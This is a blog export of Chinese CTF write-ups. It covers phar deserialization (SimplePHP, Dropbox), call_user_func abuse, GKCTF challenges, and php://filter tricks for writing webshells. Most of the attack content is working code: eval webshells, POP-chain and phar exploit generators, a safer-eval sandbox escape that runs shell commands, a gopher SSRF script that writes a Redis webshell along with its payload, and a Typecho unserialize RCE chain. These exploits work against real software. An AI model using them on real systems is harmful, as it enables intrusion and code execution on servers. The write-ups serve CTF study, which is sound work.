{"meta":{"title":"月出从云","subtitle":"","description":"","author":null,"url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2014-12-22T04:39:04.000Z","updated":"2020-10-26T06:26:08.178Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"华北赛区Dropbox","slug":"华北赛区Dropbox","date":"2020-10-29T05:49:57.000Z","updated":"2020-10-29T08:11:17.892Z","comments":true,"path":"2020/10/29/华北赛区Dropbox/","link":"","permalink":"http://example.com/2020/10/29/%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADropbox/","excerpt":"","text":"1.知识点学习1.1 phar流自PHP5.3.0开始，php便支持该数据流 支持allow_url_fopen no 支持allow_url_include No 允许读取 Yes 允许写入 Yes 在PHP的官网手册当中，该流用于解压phar文件，我们允许利用该流直接读取被压缩的phar文件，但是我们实战中却发现，该流允许我们读取任意一个文件，只要他们是经过压缩的文件，PHP会自动的解压文件，并且读取里面的PHP。 phar的参考文章： 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leroi_Liu&#x2F;article&#x2F;details&#x2F;86293701 （感觉PHP有点垃圾..使用Phar文件，但是却完全没有任何的过滤，他将识别任何模块的后缀，直接将其解压，之后读取其中的PHP文件 例如我们构造一个test.php，我们将其压缩成test.zip，之后修改zip后缀为jpg，他还是会能够识别，并且读取其中的文件 1.1.1 phar写🐎文件包含测试的代码如下： index.php 1234&lt;?php //phar://./test.jpg/test.phpinclude($_POST[&#x27;url&#x27;]);?&gt; test.php 1&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; 我们可以利用如下代码生成一个phar文件，并且生成🐎 12345678910111213&lt;?php@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub;//$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.php&quot;, &quot;&lt;?php eval(\\$_POST[123]); ?&gt;&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); 利用如下： 1.1.2 phar反序列化在以前的大部分事件，我们都是利用反序列化的函数，但是人们现在安全意识越来越高之后，这种利用方式越来越难。 但是Phar://读取文件phar的时候，会反序列化meta-data储存的信息 Phar文件的一个标准特征如下： 12&lt;?php __HALT_COMPILER(); ?&gt; O:10:&quot;TestObject&quot;:0:&#123;&#125;\b test.tx\u0002 GBMB 我们可以发现Meta-data的内容就是以反序列化的形式储存的，利用Phar协议解析的时候都会反序列化，同时文件操作函数一般都能用伪协议流，所以Phar://的供给面还是相当广的。 所以满足如下条件的时候该类型序列化可以使用： 可以上传Phar文件(或者文件自己使用Phar读取) 具有可利用的魔术方法 文件操作函数的参数可用 例题：[SWPUCTF 2018]SimplePHP 首先就尝试读取一波文件file.php 1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; Class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; 同时还拥有一个f1ag.php 直接访问的话会不允许，在show类当中放出了提示，pahr://phar.jpg 查找POP链的过程是这样的： Test的$text = base64_encode(file_get_contents($value));作为我们的终极目标 我们查看$value是从哪里传来的，发现一行： 1$value = $this-&gt;params[$key]; 之后查看，发现$key通过__get进行传导 于是构造 1$c-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;; 回到上面看，因为之前有echo，通过echo查找tostring 于是对source进行控制 1$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; 对A进行反序列化即可。 1.2 open_basedir该函数是php用于基于x目录允许，利用该函数，PHP可以限制用户的读取文件范围，这也就很好的解释了为什么我们只能读取到../../index.php的内容，而无法读取到根目录下flag.txt的文件了 2.做题思路1.任意文件读取这道题允许下载文件，上传文件和删除文件，我们下载文件的时候可以任意修改文件名（但是由于open_basedir的限制，我们没法办法读取到flag 故利用如下方式能够找到class.php,index.php,download.php,delete.php的内容 2.构造phar反序列化根据前面的知识，我们知道我们可以利用phar生成文件，构造pop链读取文件，问题就在于如何构造pop了，我们在这道题很明显要找到的函数就是file_get_contents，能找到File类下的close()类会使用，于是查找全文当中，看看有没有魔术方法能够使用到close类： 最终在User类中查找到： 1234567891011121314class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; // 中间略 public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125; 于是第一次我尝试如此构造文件： 1234567891011121314151617181920&lt;?phpclass User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class File &#123; public $filename=&quot;test.txt&quot;; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125; 结果在本地fuzz的时候就发现这样子就压根没回显啊。后来才知道必须输出一下才能看见内容。。 1234567class File &#123; public $filename=&quot;test.txt&quot;; public function close() &#123; echo file_get_contents($this-&gt;filename); return file_get_contents($this-&gt;filename); &#125;&#125; 于是就卡住了，上下再审计代码，找一个echo函数，发现恰好就在FileList当中。。： 1234567891011121314151617public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; //这句是全局的核心 $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; 想办法，能够控制result，发现题目也正好给出了call这个魔术方法： 123456public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; 自己看了一些，这个其实就是一个手写的回调函数嘛。 于是尝试思考，我们可以通过FileList出发 12345678910111213141516class User &#123; public $db;&#125;class File &#123; public $filename;&#125;class FileList &#123; private $files; private $results; private $funcs;public function __construct($path) &#123; $files = new File(); $this-&gt;funcs = array($files); $filenames =&quot;/flag.txt&quot;; &#125;&#125; 我们先new一个User类出来，并将db指向FileList，之后类会被销毁，将会调用FileList当中的call方法，call方法需要我们指定参数名和filename，所以在__construct中进行修改,最终调试得 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?phpclass User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close();// phpinfo(); &#125;&#125;class FileList &#123; private $files; private $results; public function __construct() &#123; $file = new File();// $this-&gt;results = array(); $file-&gt;filename = &quot;test.txt&quot;; $this-&gt;files = array($file);// var_dump($file);// phpinfo(); &#125; public function __call($func, $args) &#123;// phpinfo(); foreach ($this-&gt;files as $file) &#123;// var_dump( $file-&gt;$func()); //将result设置成test.txt当中的内容 $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123;//销毁的时候就会被输出了！ foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table = &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= htmlentities($value); &#125; $table .= htmlentities($filename); &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function name() &#123; return basename($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;$a = new User();$a-&gt;db = new FileList();?&gt; 调试成功之后构造exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass User &#123; public $db;&#125;class FileList &#123; private $files; private $results; public function __construct() &#123; $file = new File();// $this-&gt;results = array(); $file-&gt;filename = &quot;/flag.txt&quot;; $this-&gt;files = array($file); &#125;&#125;class File &#123; public $filename; public function name() &#123; return basename($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;$a = new User();$a-&gt;db = new FileList();@unlink(&quot;5.phar&quot;);$phar = new Phar(&quot;5.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub;$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest //如果我们是要写phar🐎就用下面的，不然就用上面的setMeatadata$phar-&gt;addFromString(&quot;test.php&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 之后用burp上传，删除的时候读取文件即可：","categories":[],"tags":[]},{"title":"2020网鼎杯phpweb","slug":"2020网鼎杯phpweb","date":"2020-10-28T11:19:40.000Z","updated":"2020-10-28T11:34:56.495Z","comments":true,"path":"2020/10/28/2020网鼎杯phpweb/","link":"","permalink":"http://example.com/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/","excerpt":"","text":"1.访问页面curl+u，可以查看到这些： 1234&lt;form id=form1 name=form1 action=&quot;index.php&quot; method=post&gt; &lt;input type=hidden id=func name=func value=&#x27;date&#x27;&gt; &lt;input type=hidden id=p name=p value=&#x27;Y-m-d h:i:s a&#x27;&gt;&lt;/body&gt; 这样的话我们推测它就是用了一个call_user_func的回调函数.. 然后自己在这里卡了很久，最后才想起来file_get_contents函数可以读文件， 于是构造： 得到源码： 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 之后我又卡住了，看似好像是反序列化，又好像不是啊？找不到反序列化的点，一时间又僵住了，过了一会儿看了大佬的WP才意识到是自己思路还不够灵活，这道题没有unserialize，但是可以动调函数，审计代码中的Test类，其实他是有gettime的，这个函数就是一个动调函数，那我们的思路就很明确 2.构造payload1234567891011121314&lt;?phpclass Test &#123; var $p = &quot;ls&quot;; var $func = &quot;system&quot;;// function __destruct() &#123;// if ($this-&gt;func != &quot;&quot;) &#123;// echo gettime($this-&gt;func, $this-&gt;p);// &#125;// &#125;&#125;$test = new Test();echo (serialize($test)); 之后将这一段带入到题目当中，最终在tmp目录下找到","categories":[],"tags":[]},{"title":"GKCTF","slug":"GKCTF","date":"2020-10-27T08:04:11.000Z","updated":"2020-10-28T13:16:07.944Z","comments":true,"path":"2020/10/27/GKCTF/","link":"","permalink":"http://example.com/2020/10/27/GKCTF/","excerpt":"","text":"抽空把GKCTF的题目刷了，先从第一题开始说吧 1.Check in说是一道签到题，但是得用到pwn的知识【虽然exp直接就能打了 第一步访问就能审计到代码： 1234567891011121314151617181920&lt;?php highlight_file(__FILE__);class ClassName&#123; public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); 就是一个很简单的序列化，我们直接base64编码Ginkgo之后的值即可。 1?Ginkgo=cGhwaW5mbygpOw== 审计到PHP的代码，下一步我们会发现自己蚁剑连接不上，没办法，只能自己再写一个shell了 1?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA== 密码是sakani，之后就可以用蚁剑链接上去了，但是我们发现flag没法读啊。而且因为disable_function，我们 没有办法使用虚拟终端了。 但是我们查看版本，版本为PHP7.3，可以尝试用内核漏洞提权，在tmp目录（777），上传exp 1https://github.com/mm0r1/exploits 上传这里的gc漏洞，之后执行命令即可 2.老八小超市儿根据这篇文章可以做出来前半段成功拿到shell： 1https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html 这里我传入成功之后路径为： 1http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php 用蚁剑连入，根目录下找到flag却不能读，读atuo.sh可以知道它每分钟会执行一次makeflaghint.py，同时其权限是766，也就是说我们可以改~，那我们去改这个py的内容让他读flag即可，等一分钟，读到flag 3.EzNode就是一个很基础的代码审计： 12345678910111213141516171819202122232425262728app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 老板说为了后期方便优化app.use((req, res, next) =&gt; &#123; if (req.path === &#x27;/eval&#x27;) &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事 setTimeout(() =&gt; &#123; clearTimeout(t); console.log(&#x27;timeout&#x27;); try &#123; res.send(&#x27;Timeout!&#x27;); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;); 注意核心代码在worker2到worker3之间，我们发现如果delay被设置成了60*1000 而超时是1000.如果没有超时，反而会next，也就是会继续执行代码，否则直接弹回去超时，于是我们看下一步 123456789101112app.post(&#x27;/eval&#x27;, function (req, res) &#123; let response = &#x27;&#x27;; if (req.body.e) &#123; try &#123; response = saferEval(req.body.e); &#125; catch (e) &#123; response = &#x27;Wrong Wrong Wrong!!!!&#x27;; &#125; &#125; res.send(String(response));&#125;); 下面使用了saferEval的代码，接收e的参数，于是我们的目标很清晰，首先尝试绕过对超时的限制，再搜一下saferEval的数据~，文档说到： 1parseInt(string, radix) 参数 描述 string 必需。要被解析的字符串。 radix 可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。 这也就说明，如果传入delay是很大很大的数，也就不能被解析了，那我们的delay此时变成了1秒，也就绕过了超时限制，接下来我们就可以命令执行咯，尝试： 发现此时就绕过了超时的限制了！，于是再构造执行EvalSafer的代码，查到是CVE-2019-10769 1https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10 payload如下： 123456789const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123; const process = clearImmediate.constructor(&quot;return process;&quot;)(); return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted)); 其中核心代码就是theFunction，我们传入进去污染参数即可执行代码 4.EzWeb是一个redis的题目..没有做过这样的，硬着头皮做吧，访问之后根据提示访问 ?secret 查询了一些，这是内网的环境，也就是说虽然题目过滤了127.0.0.1,但是我们可以测试其他靶机的内容 访问过去之后好像也不是啥玩意儿啊,尝试用file协议的漏洞读到了index.php的源码： file:[空格]/ 1?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;提交 123456789101112131415161718192021222324&lt;!--?secret--&gt;&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;别这样&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; 我们发现过滤了dict协议，file协议，但是没有过滤http协议和gopher协议，我们猜想出题人想让我们利用http协议进行内网探测，gopher协议进行攻击,果然，在11端口上找到了变化 让我们尝试服务，因为ssrf常用的几个服务就是mysql和redis，于是分别访问3306端口和6379端口 6379上得到： 发现果然有ERR端口，于是尝试用gopher协议打一波，这里直接用了一波别人的脚本 1234567891011121314151617181920212223242526272829303132import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.96.119.11&quot; // 运行有redis的主机ipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 我们改一下主机IP为:10.160.187.11 得到payload: 1gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 5.EZ三剑客-EzTypecho这道题目，呃，原理比较难，但是利用起来却很简单，比如在这篇文章中可以找到： 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html exp就可以找到了，在做题的时候直接在finish时会发现无法利用的情况 这个时候就必须看源码了 查找session，在源码中可以找到： 12345678910 &lt;?php else : ?&gt; &lt;?php//if(!isset($_SESSION)) &#123; die(&#x27;no, you can\\&#x27;t unserialize it without session QAQ&#x27;);&#125; $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); Typecho_Cookie::delete(&#x27;__typecho_config&#x27;); $db = new Typecho_Db($config[&#x27;adapter&#x27;], $config[&#x27;prefix&#x27;]); $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); Typecho_Db::set($db); ?&gt; 我们去查找sesion在哪里赋值： 结果发现一旦在这里就被exit停下来了，于是查找start，结果发现源码当中： 1234&lt;?php $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); $type = explode(&#x27;_&#x27;, $config[&#x27;adapter&#x27;]); $type = array_pop($type); 发现它居然接收一个参数…那这样的话我们用这个去打就行了，利用脚本： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Typecho_Feed&#123; private $_type; private $_items = array(); public function __construct()&#123; $this-&gt;_type = &quot;RSS 2.0&quot;; $this-&gt;_items = array( array( &quot;title&quot; =&gt; &quot;test&quot;, &quot;link&quot; =&gt; &quot;test&quot;, &quot;data&quot; =&gt; &quot;20190430&quot;, &quot;author&quot; =&gt; new Typecho_Request(), ), ); &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params = array( &quot;screenName&quot; =&gt; &quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;, ); $this-&gt;_filter = array(&quot;assert&quot;); &#125;&#125;$a = new Typecho_Feed();$c = array( &quot;adapter&quot; =&gt; $a, &quot;prefix&quot; =&gt; &quot;test&quot;,);echo base64_encode(serialize($c)); 拿到flag： 总结：​ 题目虽然原理都很难，但是利用却很简单，自己先把题目成功的复现接出来了，以后再逐步复现原理把。","categories":[],"tags":[]},{"title":"全国工控2020-web-easyphp","slug":"全国工控2020-web-easyphp","date":"2020-10-27T06:25:53.000Z","updated":"2020-10-27T06:26:22.997Z","comments":true,"path":"2020/10/27/全国工控2020-web-easyphp/","link":"","permalink":"http://example.com/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/","excerpt":"","text":"全国工控2020-web-easyphp1.从伪协议开始说起php://filter是PHP中独有的协议，该协议流允许我们作为一个中间流来处理其他流， 在之前三个白帽中有一个比赛，其中一部分的代码： 1234&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content); 1.base64在这里我们可以看见，如果正常的编译代码，由于在开头加入了exit内容，即使我们写入了一句话也无法解析。 但是我们可以通过filename在php写入的时候构造协议，所以利用base64-decode方法解码构造一句话的payload： 1PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; 但是在这里我们又会发现如果直接打入进去，base64解析没有成功，这就是因为base是由4字节组成一次payload。所以话说回去， 当我们使用base64decode协议的时候，&lt; ? ; ?&gt;等等都不会被解析，所以源代码则会被识别为： phpexit，而base64是四个字节还原成一个字母，故我们需要再占一个位数，给她，也就是phpexit[?]构造成八个字节供basedecode使用，之后在后面再编上我们自己的payload，所以这道题可以构造如下： 1filename=php://filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg== 但是这里仍需要注意，我们构造的时候payload当中不允许出现+号等特殊字符，否则会遇见没有被写上去情况。，实际上，除了base过滤器，还有很多过滤器可以供给我们使用： 官网： 123https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php 过滤器https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php 转换过滤器https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php 字符过滤器 2.rot13除此之外我尝试使用rot13来绕过，但是会发现rot13之后的结果不合法 1filename=php://filter/write=string.rot13/resource=shell.php&amp;txt=&lt;?cuc cucvasb();?&gt; 得到php为： 1&lt;?cuc rkvg; ?&gt;&lt;?php phpinfo();?&gt; 这样的话，因为多了一个分号，而导致失败了（开启短标签的情况下，只要用&lt;? ?&gt;中的内容就会被解析）但如果关闭短标签的情况下： 1txt=?&gt;&lt;?cuc cucvasb();?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php 成功！除此之外，还补充一种骚思路： 3.iconv字符编码转换1echo iconv(&quot;utf-8&quot;,&quot;utf-7&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;) iconv函数接收三个参数，当前编码，转换后编码，之后再转回去，所以利用该特性，我们可以反其道行之。但是在这里，利用该字符编码，会导致出现之前的+号的问题，于是就失败了 1filename=php://filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4- 根据大佬给出的UCS2-2 编码的方式： 1echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;); 需要注意的是，UCS2的编码方式是2位一次转换，所以我们必须保证需要转换的编码为2位数，不够的我们可以使用空格占位,而我们上面的转换之后直接用的话，会发现无法转换，这是因为必须保证&lt;?php exit();也被成功转换，所以我们再前面再加上一个1即可， 最终payload： 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;? 写入shell： 